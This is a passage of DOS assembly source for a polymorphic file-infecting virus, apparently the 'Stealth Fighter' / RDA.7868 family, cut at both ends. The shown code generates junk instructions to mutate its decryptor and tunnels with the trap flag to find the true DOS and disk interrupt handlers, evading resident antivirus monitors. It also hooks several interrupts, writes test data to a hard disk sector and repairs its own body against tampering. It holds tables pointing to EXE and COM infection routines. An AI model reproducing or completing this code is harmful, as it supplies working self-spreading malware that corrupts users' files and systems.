           or  al, 0C0h            ; for math instr
           or  al, ds:[garbage_register]   ; with grb reg
           stosb

           mov ax, 0EA60h
           call    get_random_limit
           cmp word ptr ds:[garbage_word_byte], 1
           jnz man_bytesizer           ; put the immediate
           stosw                   ; of correct size
           jmp man_with_imm_ret
   man_bytesizer:
           stosb
   man_with_imm_ret:
           ret

   ; uses two opcodes and generates various math instructions (only 16bits)
   routines_manage_math_twobytes:
           cmp byte ptr ds:[using_8_bits_register], 1
           jz  man_with_imm_ret

           inc si             ; skip info byte
           lodsb                  ; get first opcode
           or  ax, ds:[garbage_word_byte] ; correct dimension
           stosb

           lodsb                  ; get second opcode
           or  al, 0C0h           ; for all math ops used
           or  al, ds:[garbage_register]  ; correct register
           stosb
           ret

   ; gets one opcode and correct it to use the selected register (but only
   ; for 16bits registers)
   routines_one_byte_16reg:
           cmp word ptr ds:[garbage_word_byte], 1 ; only with words
           jnz cantcreat_ret
           cmp byte ptr ds:[using_8_bits_register], 1
           jz  cantcreat_ret
           inc si
           lodsb                   ; load opcode
           or  al, ds:[garbage_register]   ; correct reg
           stosb                   ; store
   cantcreat_ret:
           ret

   ; just copies one byte
   routines_copy_one_byte:
           inc si      ; skip info byte
           lodsb           ; read byte
           stosb           ; store byte
           ret

   ; just copies one word
   routines_copy_one_word:
           inc si      ; skip info byte
           lodsw           ; read word
           stosw           ; store word
           ret

   ; just copies the given number of bytes (ie. some fake int routines and such)
   routines_copy_many_bytes:
           cmp byte ptr ds:[register_compat], 0  ; all regs must be
           jnz cant_rout_cpy             ; available
           cmp byte ptr ds:[register_compat + 1], 0
           jnz cant_rout_cpy

           call    move_through_table  ; get how many bytes has
           inc si          ; as when reading table
           mov cx, ax
           repe movsb      ; just copy the desired chunk as grb
   cant_rout_cpy:
           ret

   ; generates a jump (type from the table) and some garbage to jump over
   routines_manage_jumps:
           inc si      ; skip info byte
           lodsb           ; read/write jump type
           stosb

           mov ds:[grb_jump_place], di ; store actual pointer
           mov byte ptr ds:[using_8_bits_register], 0
           inc di
           test    byte ptr ds:[register_compat], 11h
           jz  jump_nogrb_restronax
           mov byte ptr ds:[restrict_grb_ax_is_used], 1

   jump_nogrb_restronax:
           mov ax, 5
           call    get_random_limit    ; how many instructions
           inc ax          ; the jump will jump
           mov cx, ax

   jump_garbage_loop:
           push    cx
           mov cx, 5       ; max retries to choose reg

   jump_select_usable_reg:
           push    cx
           call    select_garbage_register
           mov si, ds:[garbage_word_byte]
           mov al, 1
           mov cl, ds:[garbage_register]
           shl al, cl
           test    [si+register_compat], al
           pop cx
           loopne  jump_select_usable_reg

           or  cx, cx      ; exited for too many tries?
           jz  jump_skip_this_garbage

           cmp word ptr ds:[garbage_word_byte], 0
           jz  jump_noneed_8bitchk
           cmp byte ptr ds:[garbage_register], 3 ; if > bx then no8bit
           ja  jump_noneed_8bitchk
           mov al, 11h
           mov cl, ds:[garbage_register]
           shl al, cl
           test    ds:[register_compat], al
           jnz jump_skip_this_garbage

   jump_noneed_8bitchk:
           mov ax, 6
           call    get_instr_with_compat
           call    call_generator

   jump_skip_this_garbage:
           pop cx
           loop    jump_garbage_loop

           mov bx, di
           mov ax, ds:[grb_jump_place]
           inc ax
           sub ax, bx          ; calculate the offset for
           neg al          ; the jump
           mov si, ds:[grb_jump_place]
           mov [si], al        ; store the offset
   jump_grb_returnroutine:
           ret

   ;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;
   ; service routines, put a register to a known value.
   ;
   s_routines_mov_imm_in_reg:
           mov ax, 0D2F0h
           call    get_random_limit
           push    ax
           mov al, 0C6h            ; mov base opcode
           or  ax, ds:[garbage_word_byte]  ; correct size
           stosb
           mov bl, ds:[garbage_register]   ; second opcode for
           mov al, 0c0h            ; mov reg,imm
           or  al, bl
           stosb
           pop ax              ; the random imm

           cmp word ptr ds:[garbage_word_byte], 1
           jnz imm_here_is_byte
           stosw
           jmp imm_here_is_stored
   imm_here_is_byte:
           stosb

   imm_here_is_stored:
           mov si, ds:[garbage_word_byte]
           mov al, 1
           mov cl, ds:[garbage_register]
           shl al, cl
           or  [si+register_compat], al
           ret

   s_routines_zero_reg_with_sub_reg_reg:
           mov al, 28h         ; sub reg,reg opcode
           or  ax, ds:[garbage_word_byte]
           stosb
           mov al, ds:[garbage_register]
           mov cl, 3           ; put both src and dest to
           shl al, cl          ; the given register
           or  al, 0C0h
           or  al, ds:[garbage_register]
           stosb
           ret
   s_routines_zero_reg_with_xor_reg_reg:
           mov al, 30h         ; xor reg,reg opcode
           or  ax, ds:[garbage_word_byte]
           stosb
           mov al, ds:[garbage_register]
           mov cl, 3           ; put both src and dest to
           shl al, cl          ; the given register
           or  al, 0C0h
           or  al, ds:[garbage_register]
           stosb
           ret

   s_routines_and_reg_with_zero:
           mov al, 80h      ; and reg,imm opcode 1
           or  ax, ds:[garbage_word_byte]
           stosb
           mov al, 0E0h     ; and reg,imm opcode 2
           or  al, ds:[garbage_register]
           stosb
           mov cx, ds:[garbage_word_byte]
           inc cx       ; has lenght, so nr of imms
           mov al, 0        ; and with zero
           repe stosb
           ret

   s_routines_or_reg_with_ffff:
           mov al, 80h      ; or reg,imm opcode 1
           or  ax, ds:[garbage_word_byte]
           stosb
           mov al, 0C8h     ; or reg,imm opcode 2
           or  al, ds:[garbage_register]
           stosb
           mov cx, ds:[garbage_word_byte]
           inc cx       ; has lenght, so nr of imms
           mov al, 0FFh     ; or with -1
           repe stosb
           ret

   ;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

   int01_virus  proc    near        ; Interrupt 01h of RDA.7868
            pop     word ptr cs:[tunnel_addr+02h]
            pop     word ptr cs:[tunnel_addr]
            push    word ptr cs:[tunnel_addr]
            push    word ptr cs:[tunnel_addr+02h]

            mov     cs:[sp_],sp     ; Store stack pointer

            push    ax          ; Save AX at stack
            push    cs          ; Save CS at stack
            pop     ax          ; Load AX from stack (CS)

            cmp     word ptr cs:[tunnel_addr],ax
            jne     exam_tun_int    ; Tunneling own segment? Jump to e...

            mov     ax,cs:[tun_exit_off]
            cmp     ax,word ptr cs:[tunnel_addr+02h]
            je      int01_exit      ; Finnished tunneling? Jump to int...
   exam_tun_int:
            cmp     cs:[tun_int_stat],00000001b
            jne     scan_int21      ; Tunneling interrupt 21h? Jump to...

            cmp     word ptr cs:[tunnel_addr],70h
            jne     int01_exit_     ; Not DOS segment? Jump to int01_e...
   found_seg:
            mov     cs:[tunnel_stat],00000001b
   int01_exit:
            call    store_int01


            jmp     int01_exit__
   scan_int21:
            push    cx di si es ds  ; Save registers at stack
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     es,word ptr [tunnel_addr]
            mov     di,word ptr [tunnel_addr+02h]
            lea     si,scan_string  ; SI = offset of scan_string
            mov     cx,(scan_end-scan_begin)
            push    di          ; Save DI at stack
            cld             ; Clear direction flag
            rep     cmpsb       ; Found scan-string at instructio...?
            pop     di          ; Load DI from stack
            jne     scan_int21_     ; Not equal? Jump to scan_int21_
   found_seg_:
            pop     ds es si di cx  ; Load registers from stack

            jmp     found_seg
   scan_int21_:
            lea     si,scan_string_     ; SI = offset of scan_string_
            mov     cx,(scan_end_-scan_begin_)
            rep     cmpsb       ; Found scan-string at instructio...?
            je      found_seg_      ; Equal? Jump to found_seg_
            pop     ds es si di cx  ; Load registers from stack
   int01_exit_:
            push    bp          ; Save BP at stack
            mov     bp,cs:[sp_]     ; BP = stack pointer
            or      word ptr [bp+04h],0000000100000000b
            pop     bp          ; Load BP from stack
   int01_exit__:
            pop     ax          ; Load AX from stack

   int01_virus_ proc    near        ; Interrupt 01h of RDA.7868
   int03_virus  proc    near        ; Interrupt 03h of RDA.7868
   int2a_virus  proc    near        ; Interrupt 2ah of RDA.7868
            iret            ; Interrupt return
            endp
            endp
            endp
            endp

   store_int01  proc    near        ; Set address of interrupt 01h
            push    bp es  bx dx ax     ; Save registers at stack
            mov     bp,cs:[sp_]     ; BP = stack pointer
            and     word ptr [bp+04h],1111111011111111b

            push    ds          ; Save DS at stack
            mov     ds,word ptr cs:[int01_addr_+02h]
            mov     dx,word ptr cs:[int01_addr_]
            mov     bx,01h      ; BX = interrupt vector 01h
            call    set_int_addr
            pop     ds          ; Load DS from stack

            pop     ax dx bx es bp  ; Load registers from stack

            ret             ; Return
            endp

   tunnel_int21 proc    near        ; Tunnel interrupt 21h
            push    es          ; Save ES at stack
            mov     [tunnel_stat],00000000b

            mov     bx,21h      ; BX = interrupt vector 21h
            call    get_int_addr
            mov     word ptr [int21_addr_+02h],es
            mov     word ptr [int21_addr_],bx

            lea     dx,int01_virus  ; DX = offset of int01_virus
            call    load_int01

            mov     [tun_int_stat],00000000b

            pushf           ; Save flags at stack
            pop     ax          ; Load AX from stack (flags)
            or      ax,0000000100000000b
            push    ax          ; Save AX at stack
            popf            ; Load flags from stack (AX)

            lea     ax,tun_i21_exit     ; AX = offset of tun_i21_exit
            mov     [tun_exit_off],ax   ; Store offset of tun_i21_exit

            pushf           ; Save flags at stack
            push    cs ax       ; Save registers at stack
            mov     ah,30h      ; Get DOS version
            jmp     [int21_addr_]
   tun_i21_exit:
            cmp     [tunnel_stat],00000001b
            jne     tun_i21_exi     ; Not finnished tunneling? Jump to...

            mov     ax,word ptr [tunnel_addr]
            mov     word ptr [int21_addr_+02h],ax
            mov     ax,word ptr [tunnel_addr+02h]
            mov     word ptr [int21_addr_],ax
   tun_i21_exi:
            pop     es          ; Load ES from stack

            ret             ; Return
            endp

   tunnel_int13 proc    near        ; Tunnel interrupt 13h
            push    es          ; Save ES at stack
            mov     [tunnel_stat],00000000b
            mov     [tun_i13_stat],00000001b

            mov     bx,13h      ; BX = interrupt vector 13h
            call    get_int_addr
            mov     word ptr [int13_addr+02h],es
            mov     word ptr [int13_addr],bx

            lea     dx,int01_virus  ; DX = offset of int01_virus
            call    load_int01

            mov     [tun_int_stat],00000001b

            pushf           ; Save flags at stack
            pop     ax          ; Load AX from stack (flags)
            or      ax,0000000100000000b
            push    ax          ; Save AX at stack
            popf            ; Load flags from stack (AX)

            lea     ax,tun_i13_exit     ; AX = offset of tun_i13_exit
            mov     [tun_exit_off],ax   ; Store offset of tun_i13_exit

            pushf           ; Save flags at stack
            push    cs ax       ; Save registers at stack
            mov     ax,400h         ; Verify disk sector(s) (no sectors)
            mov     dx,0ffh         ; Head zero, drive one-hundred and...
            jmp     [int13_addr]
   tun_i13_exit:
            cmp     [tunnel_stat],00000001b
            jne     tun_i13_exi     ; Not finnished tunneling? Jump to...

            mov     ax,word ptr [tunnel_addr]
            mov     word ptr [int13_addr+02h],ax
            mov     ax,word ptr [tunnel_addr+02h]
            mov     word ptr [int13_addr],ax
   tun_i13_exi:
            pop     es          ; Load ES from stack

            ret             ; Return
            endp

   exam_cache   proc    near        ; Examine if disk is cached
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     [tun_i13_stat],00000001b

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     ax,201h         ; Read sector(s) into memory (one...)
            mov     dx,80h      ; DX = head- and drive number (ha...)
            lea     bx,data_buffer  ; BX = offset of data_buffer
            mov     cx,02h      ; CX = cylinder- and sector number
            int     13h
            jc      cache_exit      ; Error? Jump to cache_exit

            push    [bx]        ; Save two bytes of disk sector at...
            mov     [bx],'FS'       ; Store 'FS' in the second disk se...
            mov     ax,301h         ; Write disk sector(s) (one disk ...)
            call    int13_call

            mov     ax,201h         ; Read sector(s) into memory (one...)
            int     13h

            cmp     word ptr [bx],'FS'  ; Disk cached?
            pop     [bx]        ; Load two bytes of disk sector fr...
            jne     disk_cached     ; Not equal? Jump to disk_cached

            mov     [tun_i13_stat],00000000b
   disk_cached:
            mov     ax,301h         ; Write disk sector(s) (one disk sector)
            call    int13_call
   cache_exit:
            mov     [cache_stat],01h    ; Don't examine if disk is cached

            ret             ; Return
            endp

   scan_begin:
   scan_string  db        10010000b     ; NOP (opcode 90h)
            db        10010000b     ; NOP (opcode 90h)
            db        11101000b     ; CALL (opcode 0e8h,?,?)
   scan_end:
   scan_begin_:
   scan_string_ db        11111010b,10000000b
            db        11111100b     ; CLI, CMP AL,imm8 (opcode 0fah,8...)
   scan_end_:

   get_int_addr proc    near        ; Get interrupt address
            xor     ax,ax       ; Zero AX
            mov     es,ax       ; ES = segment of interrupt table
            shl     bx,01h      ; BX = offset of interrupt address
            shl     bx,01h      ; "  "   "    "      "        "
            les     bx,es:[bx]      ; ES:BX = interrupt address

            ret             ; Return
            endp

   get_int_add  proc     near       ; Get interrupt address
            lds      dx,cs:[si]     ; DS:DX = interrupt address
            endp

   set_int_addr proc    near        ; Set interrupt address
            cli             ; Clear interrupt-enable flag
            xor     ax,ax       ; Zero AX
            mov     es,ax       ; ES = segment of interrupt table
            shl     bx,01h      ; BX = offset of interrupt address
            shl     bx,01h      ; "  "   "    "      "        "
            mov     es:[bx],dx      ; Store interrupt offset
            mov     es:[bx+02h],ds  ; Store interrupt segment
            sti             ; Set interrupt-enable flag

            ret             ; Return
            endp

   load_int01   proc    near        ; Get and set address of interrupt...
            push    si          ; Save SI at stack
            xor     si,si       ; Zero SI
            call    load_int01_
            pop     si          ; Load SI from stack

            ret             ; Return
            endp

   load_int01_  proc    near        ; Get and set address of interrupt...
            push    es          ; Save ES at stack
            mov     bx,01h      ; BX = interrupt vector 01h

            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [si+int01_addr_],bx
            mov     word ptr [si+int01_addr_+02h],es
            pop     bx          ; Load BX from stack

            call    set_int_addr
            pop     es          ; Load ES from stack

            ret             ; Return
            endp

   restore_int  proc    near        ; Restore address of interrupt 13h...
            push    dx es ds        ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)
            push    ds          ; Save DS at stack

            mov     bx,21h      ; BX = interrupt vector 21h
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int21_addr__+02h],es
            mov     word ptr [int21_addr__],bx
            mov     dx,word ptr [int21_addr_]
            mov     ds,word ptr [int21_addr_+02h]
            pop     bx          ; Load BX from stack
            call    set_int_addr
            pop     ds          ; Load DS from stack

            push    ds          ; Save DS at stack
            mov     bx,13h      ; BX = interrupt vector 13h
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int13_addr_+02h],es
            mov     word ptr [int13_addr_],bx
            mov     dx,word ptr [int13_addr]
            mov     ds,word ptr [int13_addr+02h]
            pop     bx          ; Load BX from stack

            cmp     cs:[tun_i13_stat],00000001b
            je      dont_set_i13    ; Interrupt 13h is in use? Jump to...

            call    set_int_addr
   dont_set_i13:
            pop     ds          ; Load DS from stack

            mov     bx,24h      ; BX = interrupt vector 24h
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int24_addr+02h],es
            mov     word ptr [int24_addr],bx
            lea     dx,int24_virus  ; DX = offset of int24_virus
            pop     bx          ; Load BX from stack
            call    set_int_addr

            mov     bx,01h      ; BX = interrupt vector 01h
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int01_addr+02h],es
            mov     word ptr [int01_addr],bx
            pop     bx          ; Load BX from stack
            lea     dx,int01_virus_     ; DX = offset of int01_virus_
            call    set_int_addr

            mov     bx,03h      ; BX = interrupt vector 03h
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int03_addr+02h],es
            mov     word ptr [int03_addr],bx
            pop     bx          ; Load BX from stack
            lea     dx,int03_virus  ; DX = offset of int03_virus
            call    set_int_addr

            mov     bx,2ah      ; BX = interrupt vector 2ah
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int2a_addr+02h],es
            mov     word ptr [int2a_addr],bx
            lea     dx,int2a_virus  ; DX = offset of int2a_virus
            pop     bx          ; Load BX from stack
            call    set_int_addr
            pop     ds es dx        ; Load registers from stacl

            ret             ; Return
            endp

   get_int_add_ proc    near        ; Get interrupt addresses
            push    ds es       ; Save segments at stack
            lea     si,int21_addr__     ; SI = offset of int21_addr__
            mov     bx,21h      ; BX = interrupt vector 21h
            call    get_int_add

            lea     si,int13_addr_  ; SI = offset of int13_addr
            mov     bx,13h      ; BX = interrupt vector 13h
            call    get_int_add

            lea     si,int24_addr   ; SI = offset of int24_addr
            mov     bx,24h      ; BX = interrupt vector 24h
            call    get_int_add

            lea     si,int2a_addr   ; SI = offset of int2a_addr
            mov     bx,2ah      ; BX = interrupt vector 2ah
            call    get_int_add

            lea     si,int01_addr   ; SI = offset of int01_addr
            mov     bx,01h      ; BX = interrupt vector 01h
            call    get_int_add

            lea     si,int03_addr   ; SI = offset of int03_addr
            mov     bx,03h      ; BX = interrupt vector 03h
            call    get_int_add
            pop     es ds       ; Load segments from stack

            ret             ; Return
            endp

   ecc_prepare:
           pushf
           push    ax bx cx dx si di es ds
           cli

           mov ax, 9           ; selected nr of info bits
           push    ax          ; for ecc

           mov ax, 170h        ; lenght (in segments) of
           push    ax          ; stuff to check

           mov ax, offset ecc_temp_buffer
           mov cl, 4
           shr ax, cl          ; to segment
           mov dx, cs          ; virus segment
           add ax, dx
           push    ax          ; temporary memory for calc

           mov ax,offset ecc_check_data
           shr ax, cl          ; convert to segment
           add ax, dx          ; add base CS
           push    ax          ; ecc data to check with

           mov ax,offset int08_virus   ; pointer to code where ecc
           shr ax, cl          ; is calculated from
           add ax, dx
           push    ax

           call    ecc_entrypoint
           pop ds es di si dx cx bx ax
           popf
           ret

   ecc_entrypoint:
   arg_0       = word ptr  4
   arg_2       = word ptr  6
   arg_4       = word ptr  8
   arg_6       = word ptr  0Ah
   arg_8       = word ptr  0Ch

           push    bp
           mov bp, sp
           cld
           push    [bp+arg_6]  ; lenght in paras
           push    [bp+arg_4]  ; temp space
           push    [bp+arg_0]  ; where from
           call    ecc_create_table

           push    [bp+arg_8]  ; info bits
           push    [bp+arg_2]  ; check data segment
           push    [bp+arg_4]  ; ecc data segment generated before
           call    ecc_compute_diffs

           mov es, [bp+arg_4]  ; ecc data segment
           mov cx, [bp+arg_8]  ;
           shl cx, 1
           shl cx, 1
           shl cx, 1
           xor di, di
           xor ax, ax
           repe scasw
           jcxz    ecc_returnpoint ; cx=0 means body is ok, otherwise
                       ; body has to be corrected
           push    [bp+arg_8]  ; nr info bits
           push    [bp+arg_4]  ; ecc data segment that keeps changes
           push    [bp+arg_2]  ; check data segment
           push    [bp+arg_0]  ; where begins checking on code
           call    ecc_correct_diffs

   ecc_returnpoint:
           pop bp
           retn    0Ah


   ecc_create_table_second:
   arg_0       = word ptr  4
   arg_2       = word ptr  6
   arg_4       = word ptr  8

           push    bp
           mov bp, sp
           push    cx
           mov ax, 8000h
           xor cx, cx

   ecc_findmsb_2:
           test    [bp+arg_4], ax      ; lenght
           jnz ecc_findmsb_end_2
           inc cx
           shr ax, 1           ; find msb
           jmp short ecc_findmsb_2

   ecc_findmsb_end_2:
           xor ax, [bp+arg_4]      ; end lenght?
           jz  ecc_finish_calc_2

           mov ax, [bp+arg_0]      ; AX:0 has code
           add ax, [bp+arg_4]      ; + seg current chunk
           add ax, cx          ;
           sub ax, 11h         ; - 100h for com exec - 10h
                           ; to get begin of chunk
           clc
           pop cx
           pop bp
           retn    6

   ecc_finish_calc_2:
           mov ax, 0Fh
           sub ax, cx
           add ax, [bp+arg_2]
           stc             ; signal last loop

           pop cx
           pop bp
           retn    6



   ecc_create_table:
   var_10      = word ptr -10h
   var_E       = word ptr -0Eh
   var_C       = word ptr -0Ch
   var_A       = word ptr -0Ah
   var_8       = word ptr -8
   var_6       = word ptr -6
   var_4       = word ptr -4
   var_2       = word ptr -2
   arg_0       = word ptr  4
   arg_2       = word ptr  6
   arg_4       = word ptr  8

           push    bp
           mov bp, sp
           sub sp, 10h
           mov dx, 8000h

   ecc_findmsb_1:
           test    [bp+arg_4], dx      ; lenght
           jnz ecc_findmsb_end_1
           shr dx, 1           ; find position of msb
           jmp short ecc_findmsb_1

   ecc_findmsb_end_1:
           lea di, [bp+var_10]
           mov cx, 8
           xor ax, ax
           push    ss
           pop es
           repe stosw          ; clear part of stack
           mov cx, [bp+arg_4]      ; lenght

   ecc_loopcalc_1:
           test    cx, dx
           jz  ecc_finish_calc_1

           push    cx          ; lenght
           push    [bp+arg_2]
           push    [bp+arg_0]
           call    ecc_create_table_second
           mov es, ax
           jb  ecc_loopcalc_pre_end_1

           mov ax, es:0
           xor [bp+var_10], ax     ; create on local var storage
           mov ax, es:2
           xor [bp+var_E], ax
           mov ax, es:4
           xor [bp+var_C], ax
           mov ax, es:6
           xor [bp+var_A], ax
           mov ax, es:8
           xor [bp+var_8], ax
           mov ax, es:0Ah
           xor [bp+var_6], ax
           mov ax, es:0Ch
           xor [bp+var_4], ax
           mov ax, es:0Eh
           xor [bp+var_2], ax

   ecc_finish_calc_1:
           dec cx
           jmp short ecc_loopcalc_1

   ecc_loopcalc_pre_end_1:
           xchg    ax, cx
           mov cx, 8
           lea si, [bp+var_10] ; copy the generated data
           xor di, di
           repe movs    word ptr es:[di+0], word ptr ss:[si+0]
           xchg    ax, cx
           shr dx, 1       ; all the parts done?
           jb  ecc_loopcalc_end_1
           jmp short ecc_findmsb_end_1

   ; from es:0 all the generated stuff
   ecc_loopcalc_end_1:
           mov sp, bp
           pop bp
           retn    6


   ecc_compute_diffs:
   arg_0       = word ptr  4
   arg_2       = word ptr  6
   arg_4       = word ptr  8

           push    bp
           mov bp, sp
   ecc_calc_diff_next_chunk:
           mov ds, [bp+arg_0]      ; data segment calcualted at
                           ; compilation
           mov es, [bp+arg_2]      ; calculated before
           xor bx, bx

   ecc_calc_diff_loop:
           mov ax, es:[bx]
           xor [bx], ax        ; compute differences
           inc bx
           inc bx
           cmp bx, 10h
           jb  ecc_calc_diff_loop
           inc [bp+arg_0]      ; next 10h chunk
           inc [bp+arg_2]      ; next 10h chunk
           dec [bp+arg_4]      ; how many left
           jnz ecc_calc_diff_next_chunk
           pop bp
           retn    6


   ecc_correct_diffs:
   arg_0       = word ptr  4
   arg_2       = word ptr  6
   arg_4       = word ptr  8
   arg_6       = word ptr  0Ah

           push    bp
           mov bp, sp
           mov bl, 1           ; from first bit

   ecc_correct_nextbit:
           xor si, si

   ecc_correct_nextseg:
           xor cx, cx
           mov di, [bp+arg_6]      ; on ecc data
           add di, [bp+arg_4]      ; + part we are checking
           dec di

   ecc_correct_countloop:
           mov ds, di
           shr byte ptr [si], 1    ; count differences and put
           rcl cx, 1           ; in cx
           dec di
           cmp di, [bp+arg_4]
           jnb ecc_correct_countloop

           or  cx, cx
           jz  ecc_correct_bytechain_ok

           push    cx          ; else let's try to correct
           push    [bp+arg_2]
           push    [bp+arg_0]
           call    ecc_create_table_second ; get the correction
           mov ds, ax
           xor [si], bl        ; and correct

   ecc_correct_bytechain_ok:
           inc si
           cmp si, 10h
           jb  ecc_correct_nextseg

           shl bl, 1           ; next bit checking
           jnb ecc_correct_nextbit
           pop bp
           retn    8

   ; just to pad the ecc stuff to a 10h alignment
           xchg    bx,bx
           xchg    bx,bx
           xchg    bx,bx
           xchg    bx,bx
           xchg    bx,bx
           xchg    bx,bx
           nop

   ecc_check_data:
    db  80h, 80h,0C5h, 7Fh, 54h, 6Fh,0A8h,0CDh
    db  74h, 28h,  5h,0B1h,0B9h, 62h,0B2h,0B9h
    db 0BEh, 5Dh, 70h,0F2h, 3Ch,0B6h, 7Ah, 29h
    db  5Eh, 39h, 9Dh, 95h, 17h, 46h,0B7h, 23h
    db  71h, 16h,0E8h, 26h, 7Bh, 10h,0DCh, 50h
    db  3Fh, 8Fh, 77h, 1Ch, 40h, 19h, 48h, 88h
    db 0E4h, 9Bh,0E3h, 10h, 75h,0F6h,0B9h, 69h
    db 0D3h,0FDh,0BCh, 8Dh,0CFh, 62h, 56h,0A4h
    db  2Eh, 22h,0FBh,0E2h,0A3h, 27h, 1Fh, 91h
    db  23h, 28h, 45h,0D4h, 9Fh, 4Ch,0B7h, 8Bh
    db 0D7h,0A1h, 54h, 6Fh, 95h,0B4h, 4Eh, 7Dh
    db 0F9h, 93h,0B0h,0CCh,0D6h,  5h, 99h,0AAh
    db 0B9h, 37h, 36h, 99h, 19h, 2Fh, 0Bh, 59h
    db  9Eh,0E4h, 8Dh,0D0h, 93h,0F4h, 62h,0E0h
    db  3Eh, 7Ah,0B6h,0BDh,0C3h, 8Fh,0EFh, 4Fh
    db 0CCh, 24h,0D6h,  0h, 36h,0E9h, 94h, 55h
    db 0A5h, 70h,  8h,0B2h,0DAh,0A9h, 25h,0EBh
    db  1Dh, 9Fh,0FDh, 8Bh, 1Eh, 6Eh, 78h, 86h
   ; ecc data finished, 90h bytes

   string       db      0ah,0dh
            db      '"Stealth Fighter,DEMO Part (3.2) : Next mutation 06/09/95"',0ah,0dh
            db      '$'


   routines_table:
           dw offset routines_various_memoff_or_rr
           dw offset routines_copy_one_plus_imm
           dw offset routines_math_with_immediate
           dw offset routines_manage_math_twobytes
           dw offset routines_one_byte_16reg
           dw offset routines_copy_one_byte
           dw offset routines_copy_one_word
           dw offset routines_copy_many_bytes
           dw offset routines_manage_jumps

           dw offset jump_grb_returnroutine
           dw offset jump_grb_returnroutine

   ; table with routines that generate a math operation on the memory using the
   ; pointer register, ie. xor [pnt],reg and such.
   mom_table:
           dw offset mom_routines_xor_mem
           dw offset mom_routines_add_mem
           dw offset mom_routines_sub_mem
           dw offset mom_routines_ror_1_mem
           dw offset mom_routines_rol_1_mem
           dw offset mom_routines_ror_cl_mem
           dw offset mom_routines_rol_cl_mem
           dw offset mom_routines_neg_mem
           dw offset mom_routines_not_mem
           dw offset mom_routines_inc_mem
           dw offset mom_routines_dec_mem

   ; same as before, but has the complementary instruction for at the same
   ; position of the previous one (ie. add in mom_table and sub in here)
   mom_table_inv:
           dw offset mom_routines_xor_mem
           dw offset mom_routines_sub_mem
           dw offset mom_routines_add_mem
           dw offset mom_routines_rol_1_mem
           dw offset mom_routines_ror_1_mem
           dw offset mom_routines_rol_cl_mem
           dw offset mom_routines_ror_cl_mem
           dw offset mom_routines_neg_mem
           dw offset mom_routines_not_mem
           dw offset mom_routines_dec_mem
           dw offset mom_routines_inc_mem

   prepare_file dw      prepare_exe     ; Offset of prepare_exe
            dw      prepare_com     ; Offset of prepare_com
   infect_file_ dw      infect_exe      ; Offset of infect_exe
            dw      infect_com      ; Offset of infect_com

   ; table with complementary service routines used in the poly. they generate
   ; simple tasks with the given reg. the names should describe well the job.
   service_routines_table:
           dw offset s_routines_zero_reg_with_sub_reg_reg
           dw offset s_routines_zero_reg_with_xor_reg_reg
           dw offset s_routines_and_reg_with_zero
           dw offset s_routines_mov_imm_in_reg
           dw offset s_routines_mov_imm_in_reg
           dw offset s_routines_or_reg_with_ffff

   ; table with routines for possible initialization steps, like counter and
   ; pointer initializations
   table_init_type:
           dw offset i_routines_cnt_to_zero_and_pnt
           dw offset i_routines_cnt_pnt_with_imm
           dw offset i_routines_just_pointer
           dw offset i_routines_cnt_to_zero_and_pnt
           dw offset i_routines_cnt_to_zero_and_pnt
           dw offset i_routines_cnt_pnt_with_imm
           dw offset i_routines_just_pointer
           dw offset i_routines_cnt_to_zero_and_pnt

   ; table with routine for possible kinds of check if the decryption loop is
   ; finished. they are strictly connected to the way the pointer and counter were
   ; initialized at the beginning. so the routine for the check for the end of
   ; loop in this routine at Xth position is the one that complies with the
   ; initialization of the registers generated from the previous table with the
   ; entry at the Xth position.
   table_end_loop_check:
           dw offset endloop_check_counter_upwards
           dw offset endloop_check_counter_down_wl
           dw offset endloop_check_just_pointer
           dw offset endloop_check_counter_upwards
           dw offset endloop_check_counter_upwards
           dw offset endloop_check_counter_down
           dw offset endloop_check_just_pointer
           dw offset endloop_check_counter_upwards

   ; table of possible regs used as pointers
   possible_pointers:
           db    6     ; si
           db    7     ; di
           db    5     ; bp
           db    3     ; bx

   ds_      equ     word ptr $      ; Data segment (DS)
            db      00h,00h,80h,00h
   ds__         dw      ?           ; Data segment (DS)
            db      08h dup(00h)
   need_segovv dw  1
   int08_count  db      ?           ; Interrupt 08h counter
   int08_stat   db      ?           ; Status of interrupt 08h
   rda_steps_table:
   ;
   ; the next table is used to copy the rda body (from rda_basic_body) and include
   ; some garbage between the real rda instructions. each entry of the table will
   ; be interpreted as an instruction meaning how many bytes have to be copied and
   ; which registers can be used for garbage generation (so the garbage won't
   ; mess the needed registers and flags values).
   ;
   ; i won't comment all the steps one by one (which would be pretty boring :) )
   ; but will give the general scheme of the interpretation of the entries and
   ; a few examples. of course you should check the rda_basic_body part often for
   ; a correct interpretation.
   ;
   ; command byte combinations meanings, (checked in this order!):
   ;
   ; xxx0xxxx   = just copy, lenght from [bx+1], keep old reg compatibility
   ; xxxxxx1x   = garbage just with compatibility type 09
   ; xxxxx1xx   = garbage just with compatibility type 0e
   ; xxxxxxxx   = just copy, lenght from [bx+2], reg compatibilty in [bx+1]
   ;
   ;

           db  18h ;
           db 0EFh ; can use all regs as garbage
           db    3 ; copy three bytes (the delta offset call)

           db 0EFh ;
           db    2 ; copy two bytes

           dw  12  dup (02efh) ; as before

           db 0EFh ;
           db  10h ; copy 10h bytes. this bytes are the ones that are
               ; placed in rda_to_part_1 that has been choosed before

           db 0EFh ;
           db  20h ; copy 20h bytes. this bytes are the ones that are
               ; placed in rda_to_part_2 that has been choosed before
               ; the first part

           db 0EFh ;
           db  20h ; copy 20h bytes. this bytes are the second part
